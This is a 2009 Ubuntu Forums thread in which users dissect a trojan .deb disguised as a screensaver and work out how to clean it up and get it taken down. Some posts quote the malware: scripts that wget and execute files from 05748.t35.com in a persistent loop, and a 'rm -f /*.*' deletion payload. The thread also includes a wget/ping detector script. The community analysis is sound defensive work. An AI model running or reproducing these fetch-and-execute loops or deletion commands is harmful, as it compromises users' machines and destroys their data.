cat /etc/apt/sources.list
```

---

### Post by Cycron on 2009-12-08
> **NoaHall said:**
> Sorry, my mistake -
```
cat /etc/apt/sources.list
```

```
 # deb cdrom:[Ubuntu 9.04 _Jaunty Jackalope_ - Release i386 (20090420.1)]/ jaunty main restricted
# See http://help.ubuntu.com/community/UpgradeNotes for how to upgrade to
# newer versions of the distribution.

deb http://ca.archive.ubuntu.com/ubuntu/ lucid main restricted

## Major bug fix updates produced after the final release of the
## distribution.
deb http://ca.archive.ubuntu.com/ubuntu/ lucid-updates main restricted

## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu
## team. Also, please note that software in universe WILL NOT receive any
## review or updates from the Ubuntu security team.
deb http://ca.archive.ubuntu.com/ubuntu/ lucid universe
deb http://ca.archive.ubuntu.com/ubuntu/ lucid-updates universe

## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu 
## team, and may not be under a free licence. Please satisfy yourself as to 
## your rights to use the software. Also, please note that software in 
## multiverse WILL NOT receive any review or updates from the Ubuntu
## security team.
deb http://ca.archive.ubuntu.com/ubuntu/ lucid multiverse
deb http://ca.archive.ubuntu.com/ubuntu/ lucid-updates multiverse

## Uncomment the following two lines to add software from the 'backports'
## repository.
## N.B. software from this repository may not have been tested as
## extensively as that contained in the main release, although it includes
## newer versions of some applications which may provide useful features.
## Also, please note that software in backports WILL NOT receive any review
## or updates from the Ubuntu security team.
# deb http://ca.archive.ubuntu.com/ubuntu/ jaunty-backports main restricted universe multiverse
# deb-src http://ca.archive.ubuntu.com/ubuntu/ jaunty-backports main restricted universe multiverse

## Uncomment the following two lines to add software from Canonical's
## 'partner' repository.
## This software is not part of Ubuntu, but is offered by Canonical and the
## respective vendors as a service to Ubuntu users.
# deb http://archive.canonical.com/ubuntu jaunty partner
# deb-src http://archive.canonical.com/ubuntu jaunty partner

deb http://security.ubuntu.com/ubuntu lucid-security main restricted
deb http://security.ubuntu.com/ubuntu lucid-security universe
deb http://security.ubuntu.com/ubuntu lucid-security multiverse
deb http://ca.archive.ubuntu.com/ubuntu/ lucid-proposed restricted main multiverse universe
deb http://ppa.launchpad.net/bisigi/ppa/ubuntu jaunty main
deb-src http://ppa.launchpad.net/bisigi/ppa/ubuntu jaunty main

``` btw i have ubuntu 10.04 lucid lynx

---

### Post by conorsulli on 2009-12-08
> **Cycron said:**
> I did that... now what?

You should be ok ... This was just some fool up to no good sending out a ping from your pc by the looks of it.
you can subscribe to this thread to keep updated but for now you should be just fine.

**The files are gone** from what I understand with that

Ill mail ya on gnome-look if otherwise
:popcorn:

---

### Post by NoaHall on 2009-12-08
Also, could you post the output of ```
 ls -a /etc/apt/
```

---

### Post by M!K3_$ on 2009-12-08
> **akashiraffee said:**
> The real bad guy is this one:
[http://05748.t35.com](http://05748.t35.com)

i googled the URL and got some interesting things. it looks like this is for a phishing site to get ahold of WoW passwords or the such

[noparse]http://www.mmowned.com/forums/wow-scams/228194-wow-phishing-pack.html[/noparse]

[http://www.google.ca/search?q=http%3A%2F%2F05748.t35.com%2F&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:official&client=firefox-a]("http://www.google.ca/search?q=http%3A%2F%2F05748.t35.com%2F&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:official&client=firefox-a")

---

### Post by Cycron on 2009-12-08
> **NoaHall said:**
> Also, could you post the output of ```
 ls -a /etc/apt
``` ```

.              sources.list              .sources.list.swm  trusted.gpg
..             sources.list~             .sources.list.swn  trusted.gpg~
apt.conf.d     sources.list.d            .sources.list.swo
preferences.d  sources.list.distUpgrade  .sources.list.swp
secring.gpg    sources.list.save         trustdb.gpg

```

---

### Post by akashiraffee on 2009-12-08
[SIZE=6][COLOR=Purple]**ATT: Everyone who installed that.**[/COLOR][/SIZE]

I'm gonna write a little script you can run in the background for a few days that will detect if someone is still using wget on your system.  I'll post it here in ~ 30 min.

---

### Post by NoaHall on 2009-12-08
Could you post the output of ```
ls -a /etc/apt/sources.list.d/
``` too? Sorry for asking a lot - I just want to make sure there's no damage.

---

### Post by Cycron on 2009-12-08
> **akashiraffee said:**
> [SIZE=6][COLOR=Purple]**ATT: Everyone who installed that.**[/COLOR][/SIZE]

I'm gonna write a little script you can run in the background for a few days that will detect if someone is still using wget on your system.  I'll post it here in ~ 30 min.

OK... just make sure you don't *accidentally *put a virus in it... O.o

---

### Post by Cycron on 2009-12-08
> **NoaHall said:**
> Could you post the output of ```
ls -a /etc/apt/sources.list.d/
``` too? Sorry for asking a lot - I just want to make sure there's no damage.
```
.                               google-chrome.list.save
..                              playonlinux.list
google-chrome.list              playonlinux.list.distUpgrade
google-chrome.list.distUpgrade  playonlinux.list.save

```

---

### Post by marshmallow1304 on 2009-12-08
I'm getting into this a little late, but did anyone look at [noparse]http://05748.t35.com/[/noparse] in the last few minutes?  Was it always like that?

There is something rotten, and not just grammar.

---

### Post by ibuclaw on 2009-12-08
> **pbrane said:**
> This is the contents of the Auto.bash script.

```
while :
do
rm /usr/bin/run.bash
cd /usr/bin/
wget http://05748.t35.com/Bots/index.php
wget http://05748.t35.com/Bots/run.bash
sleep 4
rm index.php
chmod 755 run.bash
command -p /usr/bin/run.bash
done

```

you may want to se if run.bash is running. if so kill it. And then remove it from /usr/bin/

gnome.sh runs Auto.bash

Also you can whois mmowned.com and complain to the hosting company. Interesting I just looked up the hosting company and they advertise protection against DOS attacks.

I downloaded run.bash via:
```
wget http://05748.t35.com/Bots/run.bash
```
And analysed the contents to find that it is an rm command to remove all files in / (but not subdirectories).

---

### Post by NoaHall on 2009-12-08
Cycron: It appears to be fine. If you notice any strange behaviour, report it here.

Taken from the site - > If your reading this from coming from that ubuntu forums place, Well done you saw right thourgh my "Screensaver" cough cough wink wink, I can tell you this. Basically after getting some scripts to run upon start up, It then sets to work downloading another file, This can be changed on my server so in essence i could do whatever i like on your computer, But i only really want to perfrom a DOS (denial of service) attack, For no reason I'm attacking mmowned.com, Just using it as a test. Hats Off!  


Uh-oh.

Tinvole - you did? I can't see it, only the ping.

---

### Post by running_rabbit07 on 2009-12-08
This is what this link [s]([noparse]http://05748.t35.com/[/noparse])[/s] says when opened via FF. 

> "If your reading this from coming from that ubuntu forums place, Well done you saw right thourgh my "Screensaver" cough cough wink wink, I can tell you this. Basically after getting some scripts to run upon start up, It then sets to work downloading another file, This can be changed on my server so in essence i could do whatever i like on your computer, But i only really want to perfrom a DOS (denial of service) attack, For no reason I'm attacking mmowned.com, Just using it as a test. Hats Off!  "

---

### Post by doas777 on 2009-12-08
> **tinivole said:**
> I downloaded run.bash via:
```
wget http://05748.t35.com/Bots/run.bash
```And analysed the contents to find that it is an rm command to remove the entire filesystem...


hmmm. that wasn't there a couple hours ago. looks like the op caught it just in time.
just goes to show, a well staged deployment is everything.

---

### Post by running_rabbit07 on 2009-12-08
> **conorsulli said:**
> well I dont want a congrats...

Keep viruses in the windows world 

Thank you

I doubt you will get anything when going to the link. That link is in the screensaver script which the you were talking about.

---

### Post by NoaHall on 2009-12-08
Yes, a script to display the ads. As far as I can tell, it's a free website hosted on t35.com, set-up so the person could test this out. Has someone contacted t35.com yet?

---

### Post by conorsulli on 2009-12-08
Wait there was rm commands to delete stuff in / ?

---

### Post by NoaHall on 2009-12-08
> **conorsulli said:**
> Wait there was rm commands to delete stuff in / ?

As far as I can tell, the command there was ```
 sudo rm -f /*
```(need tinvole to confirm this)

This wouldn't have caused damage - you need a -r there too to delete folders.

---

### Post by Enlightened Shadow on 2009-12-08
So what is the bottom line for me guys? How do I get over this and move on?

---

### Post by conorsulli on 2009-12-08
> **running_rabbit07 said:**
> I hope you weren't calling me a clown for posting the results of going to the site that is in the above mentioned script. I have no intention of messing with anybody's system.

No, can I stress I was not throwing insults at you if it came across as so....

I was referring to the idle head that *created* the deb and posted it on gnome-look.

I appreciate any help that came from the people here in the thread.
;)

---

### Post by akashiraffee on 2009-12-08
[SIZE=6][COLOR=Purple]**Horse scanner ready ;)**[/COLOR][/SIZE]

Okay, if anything else was installed and hidden somewhere (it could be activated from an init.d script, all the original stuff could just be more "trojan" for the horse), presuming they are still using wget and ping, just open a terminal and run this script in the foreground for a few hours.
```

#!/bin/sh

while :
do
check=`ps -o pid,cmd -A | egrep '\bwget\b|\bping\b'`

if [ -n "$check" ]; then
    echo "!!-> pid $check <-!!"
fi

sleep 1

done

```It shouldn't produce any output unless someone runs ping or wget:
```

**root ~/shell:** ./check.sh 
!!-> pid 28140 ping bbc.co.uk <-!!
!!-> pid 28140 ping bbc.co.uk <-!!
!!-> pid 28140 ping bbc.co.uk <-!!
!!-> pid 28140 ping bbc.co.uk <-!!
!!-> pid 28140 ping bbc.co.uk <-!!
!!-> pid 28140 ping bbc.co.uk <-!!

```Which ping and wget do not start by themselves.

---

### Post by NoaHall on 2009-12-08
> **Enlightened Shadow said:**
> So what is the bottom line for me guys? How do I get over this and move on?

```
sudo rm -f /usr/bin/Auto.bash /usr/bin/run.bash /etc/profile.d/gnome.sh index.php run.bash && sudo dpkg -r app5552
```

---

### Post by Enlightened Shadow on 2009-12-08
> **NoaHall said:**
> ```
sudo rm -f /usr/bin/Auto.bash /usr/bin/run.bash /etc/profile.d/gnome.sh index.php run.bash && sudo dpkg -r app5552
```


Thank you. I haven't been home for the last 1hr and 30mins so I just needed someone to catch me up real quick so I could get rid of all threats before they become worse.

---

### Post by running_rabbit07 on 2009-12-08
> **conorsulli said:**
> No, can I stress I was not throwing insults at you if it came across as so....

I was referring to the idle head that *created* the deb and posted it on gnome-look.

I appreciate any help that came from the people here in the thread.
;)

OK, I had to ask. I am definitely grateful for the folks here that are figuring this problem out and I am happy that the OP noticed something that didn't look right.

---

### Post by conorsulli on 2009-12-08
> **running_rabbit07 said:**
> OK, I had to ask. I am definitely grateful for the folks here that are figuring this problem out and I am happy that the OP noticed something that didn't look right.

That was me ;)... sorry for gloating but it was just too hard to resist ;)

---

### Post by NoaHall on 2009-12-08
It felt so wrong to fix this by being safe by loading Windows...

---

### Post by Random-penguin on 2009-12-08
> **NoaHall said:**
> It felt so wrong to fix this by being safe by loading Windows...


Cringe..................................

---

### Post by MooPi on 2009-12-08
The original content on "gnome-look has been removed. Good job boys and girls that's one down. Fun thread

---

### Post by conorsulli on 2009-12-08
> **akashiraffee said:**
> [SIZE=6][COLOR=Purple]**Horse scanner ready ;)**[/COLOR][/SIZE]

Okay, if anything else was installed and hidden somewhere (it could be activated from an init.d script, all the original stuff could just be more "trojan" for the horse), presuming they are still using wget and ping, just open a terminal and run this script in the foreground for a few hours.
```

#!/bin/sh

while :
do
check=`ps -o pid,cmd -A | egrep '\bwget\b|\bping\b'`

if [ -n "$check" ]; then
    echo "!!-> pid $check <-!!"
fi

sleep 1

done

```It shouldn't produce any output unless someone runs ping or wget:
```

**root ~/shell:** ./check.sh 
!!-> pid 28140 ping bbc.co.uk <-!!
!!-> pid 28140 ping bbc.co.uk <-!!
!!-> pid 28140 ping bbc.co.uk <-!!
!!-> pid 28140 ping bbc.co.uk <-!!
!!-> pid 28140 ping bbc.co.uk <-!!
!!-> pid 28140 ping bbc.co.uk <-!!

```Which ping and wget do not start by themselves.

Thanks very much for this.
Can be run without super yes?

---

### Post by fatality_uk on 2009-12-08
> **NoaHall said:**
> It felt so wrong to fix this by being safe by loading Windows...

lol - unclean, unclean :D

Wondering how long before this gets slashdot'd or el'reged with a END OF DAYS "Linux Hacked" spin

---

### Post by Chamillionaire2 on 2009-12-08
> **MooPi said:**
> The original content on "gnome-look has been removed. Good job boys and girls that's one down. Fun thread

 somehow I doubt this will be the last we will see of this.

---

### Post by fromthehill on 2009-12-08
> **hoppipolla said:**
> We need to install packages like this (screensavers etc) for OUR USER ONLY BY DEFAULT, so damage is contained.
then they just add a gksu or something to the script
most people don't know inside what kind of package a screensaver should be.

---

### Post by Random-penguin on 2009-12-08
> **hoppipolla said:**
> I looked at the scripts, what a shame that someone decides to pointlessly damage other Linux users machines - what is their problem?

However, it does show the holes in the existing system. It's a wonderful system, but it does still follow this theory that the root user can do no wrong, which is just incorrect because not all "admins" are that bright!

We need to install packages like this (screensavers etc) for OUR USER ONLY BY DEFAULT, so damage is contained.


Now that would make sense and I am thinking of those new to the Linux experience... it can be all so daunting and easy to slip up on good admin practice. On one hand we're trying to push Linux out to the masses but we don't have clarity (for the newbie / casual user) on what is good practice! I think part of the solution in Ubuntu would be a user friendly firewall by default with sensible settings. And perhaps a beginners guide on where to install from (this ain't windows - stick to the repos and you will be safe).

---

### Post by hoppipolla on 2009-12-08
> **fromthehill said:**
> then they just add a gksu or something to the script
most people don't know inside what kind of package a screensaver should be.

well, true. It's tricky when people are given so much freedom to put whatever they want into packages.

However, I still think we need to enhance package management to recognize different users more.

Not everything should be installed as root, IMO :)

> **tinivole said:**
> Quite contrary, this is not a hole in the system. This is social engineering applied outside of lab testing.
It is no surprise that people fell for the cookie.

But as much as we teach you not to download anything from untrusted sites - people will fall for the "Linux Security" propaganda and get complacent.

Linux is a strong system **not** because of the system being "built ground up for security", that is but a small piece in the puzzle. Linux is a strong system because it's users are generally "in the know" about threats and prevention.

I don't agree at all, Linux IS more secure from the ground-up due to it's strict permissions system, not opening too many ports, rapid open source development and probably other things that I am not aware of :)

---

### Post by pbrane on 2009-12-08
Has anyone tried to contact Interserver, Inc.?

[email]abuse@trouble-free.net[/email] 

they host 05748.t35.com

---

### Post by fatality_uk on 2009-12-08
> **tinivole said:**
> This is neither end of days - nor Linux being hacked. Think of this as a warning to all **Debian** system users who download and run untrusted files and installers on their production machines.

99% of other Linux users will carry on their everyday life not knowing this ever happened...

I know!! I am aware of what the script does/did. Its the "spin" i'm talking about, not the fact that this script which wont propagate against

---

### Post by koenn on 2009-12-08
> **NoaHall said:**
> As far as I can tell, the command there was ```
 sudo rm -f /*
```(need tinvole to confirm this)

This wouldn't have caused damage - you need a -r there too to delete folders.
10 minutes ago it said: ```
 rm -f /*.*
echo "You see this? It's changed, before it was set to ping?"

```

As someone pointed out, the trojan downloads this file at every run (ie every logon) so the payload can be updated indefinitely. 
i.e. it looks as if this kid is experimenting with payloads and has some trouble getting the syntax right. 
Or it's a proof of concept - assuming the (ineffective) command will be shown together with the echo msg - something like "see what I could do" - although you'd have to run that as root to do real damage

---

### Post by EnGorDiaz on 2009-12-08
> **conorsulli said:**
> Hello guys Im going to make this breef

I have installed a deb from a site claiming to be an Screensaver however it looked dodgy however I proceeded.

after I looked into the source I found MYSTERIOS ACTIVITY FOR WHAT SHOULD BE A SCREENSAVER... IS THIS REQUIRED? (below)
(also no screensaver was ever shown in gnome-screensaver)

#!/bin/sh
cd /usr/bin/
rm Auto.bash
sleep 1
wget [http://05748.t35.com/Bots/Auto.bash](http://05748.t35.com/Bots/Auto.bash)
chmod 777 Auto.bash
echo -----------------
cd /etc/profile.d/
rm gnome.sh
sleep 1
wget [http://05748.t35.com/Bots/gnome.sh](http://05748.t35.com/Bots/gnome.sh)
chmod 777 gnome.sh
echo -----------------
clear
exit


Im no expert but this looks just wrong!!

I have removed the package however I i doubt this has done much good...

Please help, comments exist from other users who have downloaded this file not understanding why their screensaver did not show up and probably left the file installed.

This all just litterally happened in the last few minutes and im affraid to reboot my computer.. should I reinstall my gnome packages?

Or was I just being paranoid? Im thinking I should contact the other users who have downloaded the file and request the file be pulled if it is in fact some attack...

Sorry for sounding strange, Just trying to fix this A.S.A.P.

Thank you for any suggestions.

that is not for a screensaver

that is for a irc bot

---

### Post by NoaHall on 2009-12-08
> **EnGorDiaz said:**
> that is not for a screensaver

that is for a irc bot

No it's not, but hey. We've solved it.

koenn - Yeah, from the quote on the website too, I don't think it was meant to cause damage yet - just a attempt - or maybe when he found he was discovered, he tried to make it just look like a attempt.

---

### Post by akashiraffee on 2009-12-08
> **conorsulli said:**
> Thanks very much for this.
Can be run without super yes?

Yeah, strangely enough "ps -A" shows all processes even if they aren't yours.

It won't use any resources.  You can leave it on all day, etc.

---

### Post by Random-penguin on 2009-12-08
> **tinivole said:**
> We have a "Security Discussions" sub-forum.

Although, no one really ever reads the stickies in there.

[Ubuntu Security. Written by bodhi.zazen]("http://ubuntuforums.org/showthread.php?t=510812")

Regards


Which says to me this method of getting the message across is not working... I'm not saying I know the answer but maybe this does need to be examined by those that package Ubuntu.....

---

### Post by lisati on 2009-12-08
Just looked at the website. There've been changes apparently.

---

### Post by NoaHall on 2009-12-08
> **lisati said:**
> Just looked at the website. There've been changes apparently.

Well, maybe he's decided to go back to where ever he came from. Hopefully.

Most likely though, he's deleted his account there and made a new one else where.

---

### Post by slakkie on 2009-12-08
Dunno if someone looked further, but the script is HARMFULL, it contains an rm -f /*.* entry (which will match only files containing dots, so it will leave most binaries unharmed), but run as root that script could hose your system.

I would remove it ASAP.

---

### Post by koenn on 2009-12-08
> **slakkie said:**
> Dunno if someone looked further, but the script is HARMFULL, it contains an rm -f /*.* entry (which will match only files containing dots, so it will leave most binaries unharmed), but run as root that script could hose your system.

I would remove it ASAP.

see post 121

---

### Post by slakkie on 2009-12-08
> **koenn said:**
> see post 121

Yes, i saw it after i posted.

---

### Post by earthpigg on 2009-12-08
one of the first successful social engineering malware/botnet was reported here 4 hours ago.

within 3 hours, a community member has created a Trojan Horse Detector.

<3

edit: let's assume the bad guy is also reading this thread.

lets assume there are still folks out there affected by this, who will not have read this thread between now and the next time his botnets all 'calls home' for directions.

my prediction of his next move in the wargame...

he has his botnet all copy the binaries for wget and ping to "tegw" and "gnip" or something else to obfuscate the process name. the botnet no longer uses wget and ping. now it uses "tegw" and "gnip". so that [the script posted above]("http://ubuntuforums.org/showpost.php?p=8464817&postcount=102") will no longer detect infection.

in fact, we need to go ahead and assume the script above will no longer function as of 6 hours from now.

posting this now as i think of our next move in this little ballet.

---

### Post by conorsulli on 2009-12-08
People, please report  the issue to T35.com,

[email]abuse@t35.net[/email]

We need this issue to be raised with the Host. here is an example of what I wrote:

[noparse]http://05748.t35.com/[/noparse] is being used as a point to carry out malicious attacks Debian based Linux desktops...

Please follow this thread where we are trying to resolve the issue and where I would request after you read the forum this account be promptly banned or the files removed. 

[http://ubuntuforums.org/showthread.php?t=1349678](http://ubuntuforums.org/showthread.php?t=1349678)

The account also seems to be used for phishing
Myself and others affected by the issue would appreciate a prompt response.

Thank you

-----------------------------------------------

Please report back if you have done so so I may keep a tab on weather the complaint is being listened to. The only way we can truly remove this threat is to remove the threat from it's source.

All help appreciated we need to kill this nonsense fast.


E-mail = [email]abuse@t35.net[/email]

---

### Post by teward on 2009-12-08
> Report this to the hostEmailed them an abuse email, hopefully they read it.

---

### Post by tacantara on 2009-12-08
> **earthpigg said:**
> one of the first successful social engineering malware/botnet was reported here 4 hours ago.

within 3 hours, a community member has created a Trojan Horse Detector.

<3

edit: let's assume the bad guy is also reading this thread.

lets assume there are still folks out there affected by this, who will not have read this thread between now and the next time his botnets all 'calls home' for directions.

my prediction of his next move in the wargame...

he has his botnet all copy the binaries for wget and ping to "tegw" and "gnip" or something else to obfuscate the process name. the botnet no longer uses wget and ping. now it uses "tegw" and "gnip". so that [the script posted above]("http://ubuntuforums.org/showpost.php?p=8464817&postcount=102") will no longer detect infection.

in fact, we need to go ahead and assume the script above will no longer function as of 6 hours from now.

posting this now as i think of our next move in this little ballet.

+1 earthpigg - This is another reason why Ubuntu is separate from the other "mainstream" operating systems.  A similar attack on Windows would have resulted in a security update in the next "Update Tuesday," or whenever they decided to release a security update.  The Forum has made it possible for word to get out almost immediately, and some solutions to be posted within a short time.

I'm glad that I don't download (or use) screen savers, but I realize that the possibility now exists for .DEB packages to carry malicious code.  Thanks to all who have posted this vital information.

---

### Post by scouser73 on 2009-12-08
> **tacantara said:**
> +1 earthpigg - This is another reason why Ubuntu is separate from the other "mainstream" operating systems.  A similar attack on Windows would have resulted in a security update in the next "Update Tuesday," or whenever they decided to release a security update.  The Forum has made it possible for word to get out almost immediately, and some solutions to be posted within a short time.

I'm glad that I don't download (or use) screen savers, but I realize that the possibility now exists for .DEB packages to carry malicious code.  Thanks to all who have posted this vital information.

+1, I don't download screen-savers myself but this issue has certainly made me think about the security of my computer.

---

### Post by running_rabbit07 on 2009-12-08
Actually it would probably be up to the AV provider to catch and block the Trojan.

> **scouser73 said:**
> +1, I don't download screen-savers myself but this issue has certainly made me think about the security of my computer.

Same here. I always run NoScript in FF, but things like this could happen to me just as well, being I thought of gnome-look as being trusted. Other than themes from that site, all other software I get comes from known safe sites, such as cisco.netacad.net and mozilla.com.

---

### Post by pbrane on 2009-12-08
> **conorsulli said:**
> People, please report  the issue to T35.com,

[email]abuse@t35.net[/email]



When I whois the site I get *abuse@trouble-free.net*

05748.t35.com is hosted by Interserver, Inc

if *abuse@t35.net* is the right one I'll email that too.

---

### Post by slakkie on 2009-12-08
> **pbrane said:**
> When I whois the site I get *abuse@trouble-free.net*

05748.t35.com is hosted by Interserver, Inc

if *abuse@t35.net* is the right one I'll email that too.
Mail both. The webiste is hosted at t35.com, and access is provided by Interserver. Both need to be aware of this.

---

### Post by earthpigg on 2009-12-08
> Why would the malicious screensaver payload get through ?

in your case, maybe it wont.

here, lets find out for certain and skip the theorizing:

```
wget http://dl.dropbox.com/u/1832211/christmastux2k5_1600.png
```

(a nice christmas linux desktop on my public dropbox... its a .png file. wget something else, if you like. it will be in your home folder after it downloads. the malware, of course, downloads updated instructions for itself that it then hides throughout your filesystem, and not friendly x-mas pictures to your /home/username/ folder :D)

and 
```

ping -c 3 google.com
```

if those commands work with your firewall on, the malware will 'work'.

if those commands do not work with your firewall on, the malware will not 'work'.

if we wanted to run a ***perfect*** test (almost 99.99% certainly not needed ***in theory***...), you would need to try wget and ping as root (putting sudo before the command) since the malware itself runs as root.... if you are comfy with that (ie: understand exactly what wget and ping do), go ahead and do so. if not, then please do not.

---

### Post by nerdopolis on 2009-12-08
> Your abuse report has been received and is currently being processed. Please allow up to [time ommited] hours for the abusing url to be investigated and removed (if found in violation of our terms of service). Thank you for submitting this email, we appreciate your role in helping keep our service free of spam, phishing and other illegal activities. As always, we take a tough stance on abuse and all abusing accounts are removed with the abusing ip's banned from our service and reported to local and federal authorities for further investigation.
 
 
Best Regards,
 
 
T35 Hosting Abuse Department
Email: [EMAIL="abuse@t35.net"]abuse@t35.net[/EMAIL]EDIT:
BTW: **MooPi **unless your firewall has AI capabilities, the exploit is within a simple download which most firewalls won't block.  Firewalls block attacks on telnet and things like that, but not really downloads (unless you have the firewall blocking a particular website).

---

### Post by sisco311 on 2009-12-08
> **earthpigg said:**
> 

if we wanted to run a ***perfect*** test (almost 99.99% certainly not needed ***in theory***...), you would need to try wget and ping as root (putting sudo before the command) since the malware itself runs as root.... if you are comfy with that (ie: understand exactly what wget and ping do), go ahead and do so. if not, then please do not.

ping is a setuid root command, it runs as root anyway. ;)

---

### Post by nerdopolis on 2009-12-08
Ha ha! See the attachment below! a screenshot of the 404 error from the files now!

its a breather that the guy got the rm command wrong. (unless if he was able to edit it between the 15 minutes I pressed refresh to check up on it. Then there might be trouble...)

Now thats gone, the script can no longer call home, and the systems of the people who ran this, are no longer at this guys mercy, (but they still are running the infinite loop.)

---

### Post by conorsulli on 2009-12-08
Good News.... I think?.. or just a clever spoof?

The following files give 404's

[http://05748.t35.com/Bots/gnome.sh](http://05748.t35.com/Bots/gnome.sh)
[http://05748.t35.com/Bots/index.php](http://05748.t35.com/Bots/index.php)
[http://05748.t35.com/Bots/run.bash](http://05748.t35.com/Bots/run.bash)

however [http://05748.t35.com/Bots/Auto.bash](http://05748.t35.com/Bots/Auto.bash)

stayed  up for a good while longer which makes me think that the files were just deleted and forgot about this one until just now........

EDIT: on a side note the actual [http://05748.t35.com/](http://05748.t35.com/) gives a 404 as well which indicates all the subdirectories are in fact deleted as well...(a guess though).

I'm still waiting for feedback from t35 to confirm the account was actually deleted.

Time will tell, I should get feedback in the next 2-8 hours apparently.

---

### Post by witeshark17 on 2009-12-08
Has everyone affected removed this script and sorted the issue?

---

### Post by nerdopolis on 2009-12-08
**conorsulli**  I am running a script to capture these files every 15 minutes, so I can see if they come back overnight. Oddly enough wget is giving me 40*3* errors for anything from 05749.t35.com but I am able to wget t35.com web page, and any other wget on t35.com gives me 404...

---

### Post by lisati on 2009-12-08
> **conorsulli said:**
> Good News.... I think?.. or just a clever spoof?

The following files give 404's

[http://05748.t35.com/Bots/gnome.sh](http://05748.t35.com/Bots/gnome.sh)
[http://05748.t35.com/Bots/index.php](http://05748.t35.com/Bots/index.php)
[http://05748.t35.com/Bots/run.bash](http://05748.t35.com/Bots/run.bash)

however [http://05748.t35.com/Bots/Auto.bash](http://05748.t35.com/Bots/Auto.bash)

stayed  up for a good while longer which makes me think that the files were just deleted and forgot about this one until just now........

EDIT: on a side note the actual [http://05748.t35.com/](http://05748.t35.com/) gives a 404 as well which indicates all the subdirectories are in fact deleted as well...(a guess though).

I'm still waiting for feedback from t35 to confirm the account was actually deleted.

Time will tell, I should get feedback in the next 2-8 hours apparently.
Caution! Popup on site! (Appears to be an ad for an IQ test)

---

### Post by running_rabbit07 on 2009-12-09
I think we owe a big round of thanks to the OP and all who helped figure out the problem and get the site to clean up the malware designer's files.

---

### Post by conorsulli on 2009-12-09
Thanks to all the people that shared their knowledge and created scripts advice etc, Just goes to show how quickly a rogue can be squished here.

I'm off to bed now (it's like 6.05am here) but I'll check back in the morning to see if any response was received from t35.com. Hopefully the whole thing just died away.

Talk Later

Conor.

---

### Post by NoaHall on 2009-12-09
> **witeshark17 said:**
> Has everyone affected removed this script and sorted the issue?

Yes, as far as I can tell. IF there are any more problems, we'll get them fixed as soon as possible :)

---

### Post by Enlightened Shadow on 2009-12-09
I was the first one to download this thing and install it. I have obviously been following this thread. I went to bed around 8:00 PM est. Has their been anything new figured out that I should remove from my computer since then?

I have already run this: 
sudo rm -f /usr/bin/Auto.bash /usr/bin/run.bash /etc/profile.d/gnome.sh index.php run.bash && sudo dpkg -r app5552

---

### Post by Enlightened Shadow on 2009-12-09
Guys I just attempted run the above code a second time and I received this warning message: 

dpkg: warning: ignoring request to remove app5552, only the config
 files of which are on the system. Use --purge to remove them too.

Should I purge them or just leave it alone?

---

### Post by sisco311 on 2009-12-09
> **Enlightened Shadow said:**
> Guys I just attempted run the above code a second time and I received this warning message: 

dpkg: warning: ignoring request to remove app5552, only the config
 files of which are on the system. Use --purge to remove them too.

Should I purge them or just leave it alone?

Well, the package doesn't install any config files, but just in case run:
```
sudo dpkg -P app5552
```

for more info see:
```
man dpkg | less --pattern\= "--purge"
```

---

### Post by Enlightened Shadow on 2009-12-09
OK I went ahead and purged the thing. It wouldn't let me do both -r and -P at the same time because of conflicts, which makes sense seeing how they do the same thing except Purge is more thorough.

---

### Post by doas777 on 2009-12-09
> **3rdalbum said:**
> I'm wondering whether this trojan has been added to any anti-virus definitions for (say) AVG... it would be interesting to see if the AV vendors have the same response time on Linux as they do on Windows!

Also, about the firewall: The script tells Wget to request a page on port 80. All your web page requests come through port 80, which I imagine is not blocked. Even if your firewall can block specific applications, I'd be very surprised if you haven't already unblocked Wget.

And I'd like to correct myself. I said "A firewall would not do diddly squat". I meant to say "A firewall would do diddly squat".

what would you detect? this file has no disctict executable footprint since it itself is not executable. it just uses parts of the OS to do it's job. I think it would take behavioral detection to turn it up, and any app that uses wget on a timed loop would probably be detected as well.

---

### Post by markp1989 on 2009-12-09
Its a scary thought that as the script could of been updated to do anything bad at any time , i think the rm command was done wrong on purpose just to prove a point. 

if he had included a screen saver with this file then people wouldnt of noticed atal, then he could of just changed the download script in 5 or 6 months, causing problems , by which time most people would of forgot about the screen saver they installed. 

even if the update he did didnt cause problems on the computer, he could of used it to do illegal things droping users in the ****.

he could of used it to add a user to the system, and install ssh.

---

### Post by samigina on 2009-12-09
Same attack with "Ninja Theme" from gnome-look.org, the bad boys seems to keep trying...

Theme already delete, please verify the "includes files" tab when you are going to install an untrusted deb.

---

### Post by NoaHall on 2009-12-09
> **Enlightened Shadow said:**
> Guys I just attempted run the above code a second time and I received this warning message: 

dpkg: warning: ignoring request to remove app5552, only the config
 files of which are on the system. Use --purge to remove them too.

Should I purge them or just leave it alone?

It should be fine. All fixed now :)

---

### Post by NoaHall on 2009-12-09
> **samigina said:**
> Same attack with "Ninja Theme" from gnome-look.org, the bad boys seems to keep trying...

Theme already delete, please verify the "includes files" tab when you are going to install an untrusted deb.

Today? Did anyone download it? We need to know some info from the .deb file if they did.

---

### Post by aysiu on 2009-12-09
The technical support as pertains to conorsulli's experience has ended, and this has branched into a much more general discussion, so I'm closing this thread.

I'm moving off-topic posts to [a more appropriate thread](http://ubuntuforums.org/showthread.php?t=1349801).

---

